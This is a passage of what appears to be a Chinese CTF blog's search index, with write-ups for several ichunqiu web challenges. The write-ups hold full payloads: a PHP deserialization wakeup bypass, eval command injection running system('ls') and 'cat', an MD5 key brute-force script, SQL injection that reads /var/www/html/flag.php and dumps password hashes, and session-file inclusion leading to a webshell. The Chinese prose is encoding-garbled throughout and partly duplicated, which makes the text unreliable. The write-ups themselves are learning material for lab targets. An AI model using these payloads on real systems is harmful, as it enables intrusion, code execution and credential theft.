åˆ™dieæ²¡æœ‰çš„è¯å°±ååºåˆ—åŒ–varï¼Œå¦‚æœæ²¡æ”¶åˆ°å€¼å°±é«˜äº®æ˜¾ç¤ºé‚£ä¸ªphpæ–‡ä»¶é‚£ä¸Šé¢çš„é‚£ä¸ªç±»æœ‰å•¥ç”¨ï¼Ÿçœ‹äº†ä¸€ä¸‹wpè¯´æ˜¯è¦å»çœ‹CVE-2016-7124æ¼æ´ï¼Œç„¶åå°±èƒ½ç†è§£äº†:åœ¨ååºåˆ—åŒ–çš„è¿‡ç¨‹ä¸­ï¼Œå¦‚æœä½¿ç”¨äº†Demoç±»åˆ™ä¼šä¼˜å…ˆä½¿ç”¨wakeup()å‡½æ•°ï¼Œè€Œè¿™ä¸ªwake_upå‡½æ•°åˆä¼šä½¿æ‰“å¼€çš„æ–‡ä»¶å˜æˆGu3ss_m3_h2h2.phpï¼Œè€Œæˆ‘ä»¬æ ¹æ®æç¤ºï¼ŒçŸ¥é“æˆ‘ä»¬è¦æ‰“å¼€çš„æ˜¯f15g_1s_here.phpè¿™ä¸ªæ–‡ä»¶ï¼Œåœ¨destruct()å‡½æ•°ä¸­å°±ä¼šè¢«æ‰“å¼€ï¼Œæ‰€ä»¥åœ¨è¿™é‡Œ æˆ‘ä»¬éœ€è¦ä¼ å…¥ä¸€ä¸ªå€¼ï¼Œå¹¶ä¸”è°ƒç”¨äº†classï¼Œä½¿å¾—è¿™ä¸ªå€¼çš„fileä¸ºf15g_1s_here.phpï¼Œç»•è¿‡è¿™ä¸ªwakeup()å‡½æ•°å’Œæ­£åˆ™è¡¨è¾¾å¼ï¼š 1234567891011121314&lt;?phpclass Demo{ private $file='Gu3ss_m3_h2h2.php'; public function __construct($file) { $this-&gt;file = $file; }}$a = new Demo('f15g_1s_here.php');$b = serialize($a);$b=str_ireplace(&quot;O:4&quot;,&quot;O:+4&quot;,$b);//æœ‰çš„æ—¶å€™ç»•è¿‡ä¸éœ€è¦è¿™ä¸ªæ­¥éª¤$b=str_ireplace(&quot;:1:&quot;,&quot;:2:&quot;,$b);$b=base64_encode($b);echo $b;?&gt; å¾—åˆ°è¾“å‡ºçš„ç»“æœä¸ºTzorNDoiRGVtbyI6Mjp7czoxMDoiAERlbW8AZmlsZSI7czoxNjoiZjE1Z18xc19oZXJlLnBocCI7fQ==PSï¼š1.ä¸€å¼€å§‹æˆ‘æ˜¯ç›´æ¥åœ¨burpsuitè¿›è¡Œbase64åŠ å¯†çš„ï¼Œæ€ä¹ˆéƒ½å‡ºä¸æ¥é¡µé¢ï¼Œäºæ˜¯çœ‹äº†ä¸€ä¸‹wpå‘ç°è¦åœ¨PHPä¸­å®Œæˆæ‰€æœ‰æ“ä½œï¼ŒåŒ…æ‹¬ç»•è¿‡wakeup()å‡½æ•°çš„æ“ä½œï¼Œç»•è¿‡æ­£åˆ™çš„æ“ä½œï¼Œå¹¶ä¸”è¿›è¡Œbase64åŠ å¯†ï¼Œå¦‚æœåœ¨burpsuité‡Œé¢åŠ å¯†ç»“æœæ˜¯ä¸ä¸€æ ·çš„2.æ ¹æ®ä¹‹å‰æ‰€è¯´çš„æˆ‘ä»¬éœ€è¦æ–°å»ºä¸€ä¸ªç±»ï¼Œå¹¶è°ƒç”¨é‡Œé¢çš„public functionï¼Œä½¿å¾—æˆ‘ä»¬è¾“å…¥çš„æ–‡ä»¶åå˜æˆ$fileï¼Œç„¶åå†è¢«destruct()ä¸­çš„æ–¹æ³•ä½¿ç”¨ è®¿é—®æ–°çš„é¡µé¢å¾—åˆ°ä»¥ä¸‹ä»£ç  123456789 &lt;?phpif (isset($_GET['val'])) { $val = $_GET['val']; eval('$value=&quot;' . addslashes($val) . '&quot;;');} else { die('hahaha!');}?&gt; addslashesè¿‡æ»¤äº†å•å¼•å·ã€åŒå¼•å·ã€åæ–œæ ã€nullè¿™é‡Œæ˜¯è®©æˆ‘ä»¬ä¼ å…¥ä¸€ä¸ªvalï¼Œä¼šä½¿ç”¨evalæ‰§è¡Œâ€”â€” evalå‘½ä»¤æ‰§è¡Œæ¼æ´è¿™é‡Œå­¦äº†ä¸€ç§å¾ˆå·§å¦™çš„æ„é€ è¯­å¥çš„æ–¹å¼ï¼špayloadï¼š 12?val=${eval($_GET[a])}&amp;a=system('ls');//è®©å˜é‡$valueç­‰äºæ–°å˜é‡ä¹Ÿå»æ‰§è¡Œä¸€ä¸ªevalæ¥getä¸€ä¸ªaå‚æ•°çš„å€¼ï¼Œè€Œæˆ‘ä»¬å†ä»¥getçš„æ–¹å¼å°†aå‚æ•°ä¼ å…¥æ‰§è¡Œ æ¥ä¸‹æ¥å¯ä»¥çœ‹åˆ°True_F1ag_i3_Here_233.phpè¿™æ ·ä¸€ä¸ªæ–‡ä»¶å¤¹ï¼Œç„¶åæ‰“å¼€ 123?val=${eval($_GET[a])}&amp;a=system('cat+True_F1ag_i3_Here_233.php');//è¿™é‡Œæœ‰ä¸ªåœ°æ–¹1.å› ä¸ºç©ºæ ¼è¢«è¿‡æ»¤äº†ï¼Œæ‰€ä»¥è¦ç”¨+å·æ¥ä»£æ›¿ç©ºå·ï¼ˆè¿™é‡Œå¡äº†å¥½ä¹…ï¼‰//2.æ˜æ˜å¼•å·ä¹Ÿè¢«è¿‡æ»¤äº†ï¼Œä¸ºå•¥å¼•å·è¿˜åœ¨ï¼Ÿæˆ‘è¿˜ä»¥ä¸ºæˆ‘è®°é”™äº†ä»£ç äº†ï¼ŒæŠŠå¼•å·å»æ‰ï¼Œå‘ç°æ˜¯æ‰§è¡Œä¸äº†çš„ï¼Ÿ æ„Ÿè§‰è¿™é¢˜æœ‰å¥½å¤šä¸œè¥¿ï¼Œè¦å¥½å¥½ç§¯ç´¯ä¸€ä¸‹ï¼Œå¹¶ä¸”è¦è®°å¾—å»æ•´ç†ä¸€ä¸‹ååºåˆ—åŒ–å’Œåºåˆ—åŒ–çš„æ¼æ´ä»¥åŠçŸ¥è¯†ï¼","link":"/2021/02/22/i%E6%98%A5%E7%A7%8B6/"},{"title":"iæ˜¥ç§‹7","text":"webâ€”â€”fuzzingæ‰“å¼€é¡µé¢ å•¥ä¹Ÿæ²¡æœ‰ï¼ŒæŠ“åŒ…çœ‹çœ‹æœ‰æ²¡æœ‰è§£é¢˜ä¿¡æ¯ å‘ç°å†™äº†ä¸€ä¸ªè¶…å¤§å†…ç½‘ï¼Œç™¾åº¦äº†ä¸€ä¸‹ï¼Œå†…ç½‘èŒƒå›´ä¸º10.0.0.0â€”â€”10.255.255.255ä½¿ç”¨XFFä¿®æ”¹äº†ä¸€ä¸‹IPï¼Œè®¿é—®å¾—åˆ°ä»¥ä¸Šåœ°å€ï¼Œä»–è¯´show your keyï¼Œæˆ‘ä»¬å°±å‘é€keyï¼Œä¸€å¼€å§‹æ˜¯getæ–¹å¼å‘é€çš„ï¼Œå‘ç°ä¸è¡Œï¼Œåæ¥å°±æ”¹æˆäº†postå°±å¯ä»¥äº†ã€‚ 1key is not right,md5(key)===&quot;1b4167610ba3f2ac426a68488dbd89be&quot;,and the key is ichunqiu***,the * is in [a-z0-9] å‡ºç°è¿™å¥è¯ï¼Œæ¥ä¸‹æ¥å°±ç”¨è„šæœ¬è·‘ä¸€ä¸‹åé¢ä¸‰ä½æ˜¯a-z0-9ï¼Œä½†è¿™é‡Œå¯ä»¥ç›´æ¥æŠŠåé¢é‚£ä¸²æ‹¿å»MD5è§£å¯†ä¸€ä¸‹ï¼Œå¾—åˆ°ichunqiu105 ç”¨è„šæœ¬è·‘çš„è¯å¦‚ä¸‹: 12345678910111213141516onimport requestsimport hashlibimport strings=requests.session()url=&quot;http://fe26ac8277bb435fbb5f8355355425a9e6dfa59cc4064743.changame.ichunqiu.com/Challenges/./m4nage.php&quot;headers={&quot;X-Forwarded-For&quot;:'10.0.0.0'}key='ichunqiu'payload='0123456789'for i in payload: for j in payload: for h in payload: data={&quot;key&quot;:key+i+j+h} print(data) if &quot;key is not right&quot; not in s.post(url,data=data,headers=headers).text: print(key+i+j+h) exit() æ‰“å¼€çœ‹çœ‹ 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849function authcode($string, $operation = 'DECODE', $key = '', $expiry = 0) { $ckey_length = 4; $key = md5($key ? $key : UC_KEY); $keya = md5(substr($key, 0, 16)); $keyb = md5(substr($key, 16, 16)); $keyc = $ckey_length ? ($operation == 'DECODE' ? substr($string, 0, $ckey_length) : substr(md5(microtime()), -$ckey_length)) : ''; $cryptkey = $keya . md5($keya . $keyc); $key_length = strlen($cryptkey); $string = $operation == 'DECODE' ? base64_decode(substr($string, $ckey_length)) : sprintf('%010d', $expiry ? $expiry + time() : 0) . substr(md5($string . $keyb), 0, 16) . $string; $string_length = strlen($string); $result = ''; $box = range(0, 255); $rndkey = array(); for ($i = 0; $i &lt;= 255; $i++) { $rndkey[$i] = ord($cryptkey[$i % $key_length]); } for ($j = $i = 0; $i &lt; 256; $i++) { $j = ($j + $box[$i] + $rndkey[$i]) % 256; $tmp = $box[$i]; $box[$i] = $box[$j]; $box[$j] = $tmp; } for ($a = $j = $i = 0; $i &lt; $string_length; $i++) { $a = ($a + 1) % 256; $j = ($j + $box[$a]) % 256; $tmp = $box[$a]; $box[$a] = $box[$j]; $box[$j] = $tmp; $result .= chr(ord($string[$i]) ^ ($box[($box[$a] + $box[$j]) % 256])); } if ($operation == 'DECODE') { if ((substr($result, 0, 10) == 0 || substr($result, 0, 10) - time() &gt; 0) &amp;&amp; substr($result, 10, 16) == substr(md5(substr($result, 26) . $keyb), 0, 16)) { return substr($result, 26); } else { return ''; } } else { return $keyc . str_replace('=', '', base64_encode($result)); }} ä»–çš„æ„æ€æ˜¯ æ ¹æ®39f4zSTZu9c/laWu0cRvZq7i1XMDxPnf5e4en8EtDTYmIQRKLchr36IN+pSbn9NzBae3B5mwptxrbBjlQjWJCwb0JFa47wkå’Œä¸Šé¢çš„è§£å¯†æ–¹å¼ï¼Œå°±å¯ä»¥å¾—åˆ°flag åªè¦åœ¨æœ€ååŠ ä¸Šä¸€å¥è¯: 1echo authcode($string = '5f04rJx7uHz25mDp4vUfC0JB4Nx5nMvyQzHwjRb6kN88N+T9RRipbwbHDIcRWtqXjemcJit26oE1Vu6lpdQPZ6St/obCAEc', $operation = 'DECODE', $key = 'ichunqiu105'); flag{e6240cc3-d3ea-41ec-9778-10f5ca5e308b} webâ€”â€”å†è§CMSé¦–å…ˆè¦çœ‹çœ‹æ˜¯ä»€ä¹ˆcmsï¼Œç„¶åå†å»æŸ¥æ‰¾å‡ºç°è¿‡çš„æ¼æ´ï¼Œè¿™é‡Œçœ‹äº†ä¸€ä¸‹WPï¼Œè¯´æ˜¯çœ‹å¤‡æ¡ˆå·å¯ä»¥æŸ¥è¯¢å¾—åˆ°ï¼Œå‘ç°æ˜¯é½åšCMSç„¶åæŸ¥è¯¢å·²æœ‰çš„æ¼æ´:å…ˆæ³¨å†Œä¸‹è´¦å·ï¼Œè®°å½•å¥½è‡ªå·±çš„uid:3è¯¥ç½‘ç«™çš„æ¼æ´æ˜¯è¿™æ ·çš„ï¼šåœ¨è¯¥http://3893215cde9541e9ab9e40ed01fd1bca93c93c73b8774146.changame.ichunqiu.com/member/userinfo.php?job=edit&amp;step=2 URLä¸‹å­˜åœ¨sqlæ³¨å…¥æ¼æ´ï¼Œæ‰€ä»¥æˆ‘ä»¬å¯ä»¥post 1truename=xxxx%0000&amp;Limitword[000]=&amp;email=123@qq.com&amp;provinceid=,address=(select user()) where uid=3%23 ä»¥ä¸Špayloadè¿›è¡Œæ³¨å…¥ï¼Œè¿™é‡Œè§£é‡Šä¸€ä¸‹:%00ä¼šè¢«è½¬ä¹‰æˆ\\0è€Œåé¢limitword[000]=ç©ºï¼Œåˆ™æ˜¯è¯´å°†truenameé‡Œé¢çš„000æ›¿æ¢ä¸ºç©ºï¼Œè¿™æ˜¯å°±åªå‰©ä¸‹ä¸€ä¸ª\\ï¼Œupdate table set a=â€™111â€™,b=â€™222â€™ where uid=1å‡è®¾æ›´æ–°ä¿¡æ¯çš„è¯­å¥å¦‚ä¸Šï¼Œé‚£ä¹ˆä»£å…¥å†…å®¹åˆ™å˜æˆæ˜¯:update table set a=â€™111\\â€˜,b=â€™222â€™ where uid=1é‚£ä¹ˆæ›¿æ¢çš„å†…å®¹å˜æˆç”±æœ¬æ¥çš„a=111å˜æˆa=111\\â€˜,b= è€Œæˆ‘ä»¬çš„è¯­å¥æ­¤æ—¶æˆ‘ä»¬å†å¼•å…¥ä¸€ä¸ªé€—å·ä½œä¸ºåˆ†éš”ï¼Œå°±å˜æˆæ˜¯ 1update table set a='111\\',b=',select user() wher uid=3# æ¥ä¸‹æ¥ç»§ç»­æ³¨å…¥:çˆ†å‡ºåº“åï¼Œçœ‹äº†ä¸€ä¸‹wpï¼Œè¯´flagä¸åœ¨è¿™é‡Œï¼ŒçŒœæµ‹æ˜¯åœ¨var/www/html/flag.phpï¼Œé‚£ä¹ˆè¿™é‡Œä¸ºä»€ä¹ˆå¯ä»¥çŒœæµ‹çŸ¥é“è¿™ä¸ªç»å¯¹è·¯å¾„å‘¢?è¿™é‡Œæœ‰ä¸€éƒ¨åˆ†åŸå› å§æ¥ä¸‹æ¥å¦‚ä½• é€šè¿‡sqlæ³¨å…¥æ–¹å¼æ‰“å¼€æ–‡ä»¶å‚è€ƒï¼šhttps://www.cnblogs.com/blacksunny/p/8060028.htmlä½†æ˜¯è¿™é‡Œçš„å•å¼•å·è¢«è¿‡æ»¤ æ‰€ä»¥å°±ç”¨åå…­è¿›åˆ¶è¡¨ç¤º: 12truename=xxxx%0000&amp;Limitword[000]=&amp;email=123@qq.com&amp;provinceid=,address=(select load_file(0x2f7661722f7777772f68746d6c2f666c61672e706870))where uid=3%23//select load_file('/var/www/html/flag.php') æŸ¥çœ‹æºç å³å¯è·å¾—flag webâ€”â€”notebookæç¤ºè¯´è®©æˆ‘ä»¬ä½¿ç”¨æ–‡ä»¶åŒ…å«çœ‹çœ‹ï¼Œä¸ºä»€ä¹ˆä¼šæƒ³åˆ°æ‰«æç›®å½•ï¼Ÿå› ä¸ºæˆ‘ç”¨phpinfoå°è¯•äº†å¾ˆä¹…éƒ½æ²¡æ‰“å¼€==ï¼Œæ‰«æç›®å½•çœ‹åˆ°è¿™ä¸ªæ–‡ä»¶ï¼Œä»–æ˜¯php1nFo.phpæ¥ä¸‹æ¥è¯•è¯•æ–‡ä»¶åŒ…å«åœ¨å“ªï¼šæ¥ä¸‹æ¥çœ‹çœ‹æœ‰å•¥æœ‰ç”¨çš„ä¿¡æ¯å§ï¼Œä¸»è¦æ˜¯æ¯«æ— å¤´ç»ªä¸çŸ¥é“å“ªäº›ä¿¡æ¯å¯¹æˆ‘æœ‰ç”¨ï¼Œè¿™é‡Œçœ‹äº†ä¸€ä¸‹wpå­¦ä¹ ä¸€ä¸‹æ–°çŸ¥è¯†: PHPæ–‡ä»¶åŒ…å«â€“sessionåˆ©ç”¨æ¡ä»¶ï¼šsessionæ–‡ä»¶è·¯å¾„å·²çŸ¥ï¼Œä¸”å…¶ä¸­å†…å®¹éƒ¨åˆ†å¯æ§ã€‚ phpçš„sessionæ–‡ä»¶çš„ä¿å­˜è·¯å¾„å¯ä»¥åœ¨phpinfoçš„session.save_pathçœ‹åˆ°ã€‚ session çš„æ–‡ä»¶åæ ¼å¼ä¸º sess_[phpsessid]ï¼Œè€Œ sessionid åœ¨å‘é€çš„è¯·æ±‚çš„ cookie å­—æ®µä¸­ä¹Ÿå¯ä»¥çœ‹åˆ°ã€‚æ€è·¯:æ‰€ä»¥è¿™ä¸ªæ—¶å€™å°±ç†é¡ºäº†:1.æˆ‘ä»¬å¯ä»¥åœ¨phpinfoä¸­çœ‹çœ‹sessionä¿å­˜çš„ç›®å½•åœ¨å“ªï¼Œç„¶åä½¿ç”¨æ–‡ä»¶åŒ…å«æ¼æ´æ‰“å¼€ï¼Œå› ä¸ºsessionæ–‡ä»¶å‘½åè§„åˆ™æˆ‘ä»¬ä¹ŸçŸ¥é“ã€‚2.å¦‚ä½•åˆ©ç”¨ï¼Ÿæˆ‘ä»¬æ³¨å†Œç”¨æˆ·ï¼Œç›´æ¥ç”¨phpè¯­å¥å†™å…¥æ³¨å†Œï¼Œç”±äºæ–‡ä»¶åŒ…å«æ¼æ´æ‰“å¼€æ–‡ä»¶ä¼šè‡ªåŠ¨è§£æå…¶ä¸­çš„phpè¯­è¨€ï¼Œæ‰€ä»¥æˆ‘ä»¬å°±å¯ä»¥ä¸ºæ‰€æ¬²ä¸ºäº†è¿™ä¸ªæ˜¯sessionä¿å­˜ç›®å½•PHPSESSID=u2vfju7a353mgv6j1tbch1pid7; 1/action.php?module=&amp;file=../../../../tmp/SESS/sess_u2vfju7a353mgv6j1tbch1pid7 æ³¨å†Œå¹¶ç™»å½•ï¼Œç„¶åå°±å¯ä»¥ç”¨èšå‰‘è¿æ¥ä¸Šé¢çš„æ–‡ä»¶åŒ…å«çš„é“¾æ¥ å°±å¯ä»¥çœ‹åˆ°flagäº† webâ€”â€”Vldå¼€å¤´è¯´ 12do you know Vulcan Logic Dumper?false è¿™é‡Œç•™æ„ä¸€ä¸‹è¿™ä¸ªVulcan Logic Dumper,æŸ¥çœ‹æºç ï¼Œ å‘ç°å­˜åœ¨index.php.txtæ–‡ä»¶ï¼Œæ‰“å¼€ä»¥åå¯ä»¥å¾—åˆ°ä¸€ä¸²ä»£ç å†…å®¹ï¼Œè¿™ä¸ªå°±æ˜¯Vulcan Logic Dumperåšçš„:PHPå†…æ ¸-Zendå¼•æ“ï¼šhttp://www.php.cn/php-weizijiaocheng-355597.html PHPä¸­çš„opcodeï¼šhttps://blog.csdn.net/weiyuanke/article/details/76921476 Vulcan Logic Dumperï¼šhttp://www.phppan.com/2011/05/vld-extension/ ä¹Ÿå°±æ˜¯è¯´æˆ‘ä»¬åˆšæ‰çœ‹åˆ°çš„ä¸€å †ä»£ç å…¶å®å°±æ˜¯å€ŸåŠ©vldå¾—åˆ°çš„ï¼Œphpè¯­è¨€ä¸­ä¾›zendå¼•æ“æ‰§è¡Œçš„ä¸­é—´ä»£ç opcodeã€‚æœ‰äº†opcodeä¾¿å¯ä»¥å°†å…¶ç¿»è¯‘æˆphpä»£ç ã€‚ ç½‘ä¸Šä¹Ÿæ²¡æ‰¾åˆ°ç¿»è¯‘opcodeçš„å·¥å…·ï¼Œæ‰€ä»¥åªèƒ½çœ‹ç€å¯¹ç…§è¡¨è‡ªå·±ç¿»è¯‘:å‚è€ƒå­¦ä¹ ï¼šhttps://www.cnblogs.com/wosun/p/11386434.html è¿™é‡Œç›´æ¥æ”¾ç¿»è¯‘å®Œçš„ä»£ç  ä¼ å…¥å€¼åï¼Œå¯ä»¥å¾—åˆ°è¿™ä¸ªzip![img](https://raw.githubusercontent.com/Hwwg/myphoto/master/20210224102848.png) è¿™é‡Œæœ‰ä¸ªselectè¯­å¥ï¼Œåˆ†æçœ‹çœ‹èƒ½ä¸èƒ½æ³¨å…¥ï¼š 12345678910$db = new mysql_db(); $username = $db-&gt;safe_data($_POST['username']); $password = $db-&gt;my_md5($_POST['password']);//usernameç»è¿‡mysql_db()çš„addslashesè¿‡æ»¤ $number = is_numeric($_POST['number']) ? $_POST['number'] : 1; $username = trim(str_replace($number, '', $username));//å°†usernameé‡Œé¢çš„numberæ¢æˆç©ºæ ¼ç„¶åå†æ¸…ç©º $sql = &quot;select * from&quot;.&quot;`&quot;.table_name.&quot;`&quot;.&quot;where username=&quot;.&quot;'&quot;.&quot;$username&quot;.&quot;'&quot;;//è¿™é‡Œå…¶å®è¿˜æ˜¯ä»¥å•å¼•å·é—­åˆç”¨ç‚¹è¿æ¥ç½¢äº† $row = $db-&gt;query($sql); $result = $db-&gt;fetch_array($row); è¿™é‡Œçœ‹äº†ä¸€ä¸‹wpå¦‚ä½•ç»•è¿‡ï¼Œå‘ç°å°±æ˜¯æ˜¨å¤©åˆšç”¨çš„æ–¹æ³•â€“è¿™æ¬¡å°±ä¸€å®šè¦è®°ä½äº†åœ¨è¿™é‡Œstr_replaceçš„å†…å®¹æ˜¯æˆ‘ä»¬å¯æ§çš„ï¼Œæˆ‘ä»¬çŸ¥é“%00ä¼šè¢«è½¬ä¹‰æˆ/0æ‰€ä»¥æˆ‘ä»¬è®©str_replaceçš„æ›¿æ¢ä¸º0è¿™æ ·usernameåªå‰©ä¸‹/ï¼Œç„¶åå°†åé¢æ¥ä¸Šå•å¼•å·ï¼Œï¼Œè€Œå•å¼•å·ä¼šè¢«è½¬ä¹‰åŠ ä¸Š/é‚£ä¹ˆæ­¤æ—¶å‰é¢çš„/å°±å°†è¿™ä¸ª/ç»™è½¬ä¹‰æ‰â€™å°±é€ƒé€¸å‡ºæ¥äº†ã€‚æ„é€ payload: 1number=0&amp;username=%00'and extractvalue(1,concat(2,database()))#&amp;password=123&amp;submit=%E6%8F%90%E4%BA%A4%E6%9F%A5%E8%AF%A2 ä½†æ˜¯ ç½‘é¡µä¸Šçš„è¿™ä¸ªlogin.php404äº†ï¼Ÿï¼Ÿï¼Ÿï¼Ÿï¼Ÿï¼Ÿï¼Ÿï¼Ÿåæ¥å‘ç°åŸæ¥ç›®å½•æ˜¯:1chunqiu/login.phpæˆ‘åäº†ï¼Œä¹‹å‰å°±é‡åˆ°è¿‡ï¼Œç›®å½•ç›®å½•ç›®å½•è¦å®Œæ•´ï¼ï¼é‡è¦çš„äº‹æƒ…è¯´ä¸‰éç„¶åä¸€æ­¥æ­¥æŸ¥è¯¢ä¸‹å»ï¼Œæœ€ç»ˆå¯å¾— 1number=0&amp;username=%00'and extractvalue(1,concat(2,(select group_concat(table_name) from information_schema.tables where table_schema=database())))#&amp;password=123&amp;submit=%E6%8F%90%E4%BA%A4%E6%9F%A5%E8%AF%A2 1number=00&amp;username=%000'and extractvalue(1,concat(2,(select group_concat(column_name) from information_schema.columns where table_name=0x666c6167)))#&amp;password=123&amp;submit=%E6%8F%90%E4%BA%A4%E6%9F%A5%E8%AF%A2 è¿™é‡Œæœ‰ä¸ªåœ°æ–¹éœ€è¦æ³¨æ„çš„æ˜¯ï¼Œæˆ‘ä»¬å‰é¢æ›¿æ¢çš„æ˜¯0ï¼Œå› ä¸ºä¼šè¿‡æ»¤å¼•å·ï¼Œæ‰€ä»¥=åé¢éœ€è¦ä½¿ç”¨åå…­è¿›åˆ¶è¿›è¡Œç»•è¿‡ï¼Œä½†æ˜¯ä½¿ç”¨åå…­è¿›åˆ¶æœ‰0æ‰€ä»¥è¿™é‡Œæ›¿æ¢çš„æ”¹æˆ00å°±å¥½äº†å¾—åˆ°å­—æ®µåä¸ºflag:ç”±äºæŠ¥é”™æ³¨å…¥ä¸€æ¬¡å›æ˜¾å†…å®¹æœ‰é•¿åº¦é™åˆ¶ï¼Œä¸€å¼€å§‹ä½¿ç”¨çš„select flag from flagå°±æ²¡åŠæ³•å®Œå…¨å°†flagæ˜¾ç¤ºå‡ºæ¥ï¼Œæ‰€ä»¥è¿™é‡Œæ”¹ç”¨substr 1number=00&amp;username=%000' and extractvalue(1,substr((select flag from flag),9,37))#&amp;password=123&amp;submit=%E6%8F%90%E4%BA%A4%E6%9F%A5%E8%AF%A2 flag{19b41a74-3424-42d1-aeda-974812111573}","link":"/2021/02/23/i%E6%98%A5%E7%A7%8B7/"},{"title":"iæ˜¥ç§‹8","text":"webâ€”â€”blogå°è¯•æ³¨å…¥æ— æœï¼Œå†³å®šæ³¨å†Œç™»å½•çœ‹çœ‹ï¼Œåœ¨çœ‹åˆ°å¯ä»¥ä¸Šä¼ å›¾ç‰‡çš„æ—¶å€™ï¼Œè¯•è¯•æ–‡ä»¶ä¸Šä¼ ï¼Œå‘ç°æŠ¥é”™ï¼š å¾—çŸ¥æ˜¯kindeditorï¼Œå¯»æ‰¾æ¼æ´:https://www.jb51.net/hack/367946.htmlå°è¯•æ¼æ´: 1/kindeditor/php/file_manager_json.php?path= ç›®å½•ä¸‹å­˜åœ¨æ–‡ä»¶åŒ…å«æ¼æ´ä½†ç”±äºè¯¥æ¼æ´åªæ˜¯ç›®å½•éå†æ¼æ´ï¼Œæ‰€ä»¥æ²¡åŠæ³•æŸ¥çœ‹ï¼Œäºæ˜¯å›åˆ°å‰é¢ï¼Œåœ¨posté¡µé¢å°è¯•ä¸€ä¸‹sqlæ³¨å…¥ï¼Œå­˜åœ¨æ³¨å…¥ç‚¹ï¼Œä½†æ˜¯ç”±äºä¸çŸ¥é“åˆ—åæ‰€ä»¥union selectä¸€ç›´ä½¿ç”¨ä¸äº†ï¼Œå¦‚æœæ˜¯è¿‡æ»¤çš„è¯ï¼Œå½“æˆ‘è¾“å…¥selectå‰å°æ˜¯å¯ä»¥å›æ˜¾çš„çœ‹ä¸€ä¸‹wpï¼Œè¯´æ˜¯insertæ³¨å…¥:1.æ¨æ–­insertçš„å­—æ®µæ•°â€”â€”4ä¸ªï¼špayload:4â€™,â€™5â€™)# æ­¤æ—¶æ²¡æœ‰æŠ¥é”™2.æ„é€ æ³¨å…¥è¯­å¥ï¼ŒæŸ¥çœ‹å¯å›æ˜¾å­—æ®µä½ç½®ï¼Œè¿™é‡Œæœ‰ä¸ªç‚¹ï¼Œå½“æˆ‘å¯¹åé¢çš„å†…å®¹è¿›è¡Œé—­åˆæ³¨é‡Šçš„æ—¶å€™ï¼Œå‘ç°ç½‘é¡µæ˜¯æ— å›æ˜¾å†…å®¹çš„ï¼Œæ¨æµ‹å¯èƒ½æ³¨é‡Šäº†ä»€ä¹ˆå…³é”®æŒ‡ä»¤å¯¼è‡´é¡µé¢æ— æ³•å›æ˜¾ï¼Œæ‰€ä»¥è¿™é‡Œçš„payloadåº”å†™ä¸º: 123451','1'),('aaa',(select database()),'c //miniblog1','1'),('aaa',(select group_concat(table_name) from information_schema.tables where table_schema=database()),'c//posts,users1','1'),('aaa',(select group_concat(column_name) from information_schema.columns where table_name='users'),'c//usernmaeï¼Œpassword 1','1'),('aaa',(select group_concat(password) from users),'c //dbb616c5d935d8f34c12c291066d6fb7â€”â€”&gt;melody123 ä½¿ç”¨ç®¡ç†å‘˜è´¦å·å¯†ç ç™»å½•å‘ç°æœ‰ä¸ªmanageé¡µé¢ï¼ŒæŸ¥çœ‹ï¼Œæœ‰æ–‡ä»¶åŒ…å«æ¼æ´ï¼Œä½†æ˜¯ä¾æ—§æ— æ³•çœ‹æºä»£ç æ³•ä¸€ï¼šä½¿ç”¨php://filterå°è£…åè®®è¿›è¡ŒæŸ¥çœ‹ flag{838c24a1-64d7-413b-8499-0ce7e32e0bef}å‚è€ƒå­¦ä¹ :https://www.smi1e.top/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E%E4%B8%8Ephp%E4%BC%AA%E5%8D%8F%E8%AE%AE/**æ³•äºŒ:**æ¥è‡ªå¼ åŠ›å­¦é•¿çš„åšå®¢:manager.phpè‡ªåŒ…å«äº§ç”Ÿæ ˆæº¢å‡ºï¼Œdownæ‰ç¨‹åºï¼Œphpè‡ªå¯ç¨‹åºï¼Œä½†æ˜¯å†™å…¥çš„$_FILES[â€˜tmpâ€™]å­˜å‚¨åœ¨/tmpä¸­æ²¡æœ‰è¢«åˆ é™¤ã€‚ 1payloadï¼š?module=php://filter/convert.base64encode/resource=../flag.php&amp;name= flag{838c24a1-64d7-413b-8499-0ce7e32e0bef}å‚è€ƒå­¦ä¹ :https://www.smi1e.top/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E%E4%B8%8Ephp%E4%BC%AA%E5%8D%8F%E8%AE%AE/**æ³•äºŒ:**æ¥è‡ªå¼ åŠ›å­¦é•¿çš„åšå®¢:manager.phpè‡ªåŒ…å«äº§ç”Ÿæ ˆæº¢å‡ºï¼Œdownæ‰ç¨‹åºï¼Œphpè‡ªå¯ç¨‹åºï¼Œä½†æ˜¯å†™å…¥çš„$_FILES[â€˜tmpâ€™]å­˜å‚¨åœ¨/tmpä¸­æ²¡æœ‰è¢«åˆ é™¤ã€‚çœ‹éƒ½çœ‹ä¸æ‡‚â€“å…ˆå­¦ä¹ ä¸€ä¸‹åŸç†å†æ¥è¡¥å…… æ€è·¯å°ç»“æ•´ç†ä¸€ä¸‹è¿™é¢˜çš„æ€è·¯å§ï¼Œçœ‹åˆ°loginé¡µé¢æ¨æµ‹æ˜¯æ³¨å…¥â€”â€”æ³¨å…¥æ— æœï¼Œæ³¨å†Œè´¦å·ç™»å½•é¡µé¢ç»§ç»­æ¢ç´¢â€”â€”å°è¯•ä¸Šä¼ æœ¨é©¬æ¥getshellï¼Œå‘ç°æ ¹æœ¬ä¸Šä¼ ä¸äº†â€”â€”çœ‹åˆ°è·¯å¾„ä¿¡æ¯ï¼Œè¿˜æœ‰ç¼–è¾‘å™¨çš„åå­—â€”â€”ç™¾åº¦æœç´¢å·²æœ‰æ¼æ´ï¼Œå‘ç°æœ‰æ–‡ä»¶æµè§ˆéå†æ¼æ´â€”â€”å‘ç°flag.phpï¼Œæ— æ³•ä½¿ç”¨phpå°è£…åè®®æ•…æ— æ³•æ‰“å¼€æºç â€”â€”å›åˆ°é¡µé¢å»å¯»æ‰¾çº¿ç´¢ï¼Œåœ¨posté¡µé¢å°è¯•SQLæ³¨å…¥ï¼Œå‘ç°æœ‰æ³¨å…¥ç‚¹äºæ˜¯å¼€å§‹å°è¯•æ³¨å…¥â€”â€”æ³¨å…¥æˆåŠŸè·å¾—adminçš„å¯†ç 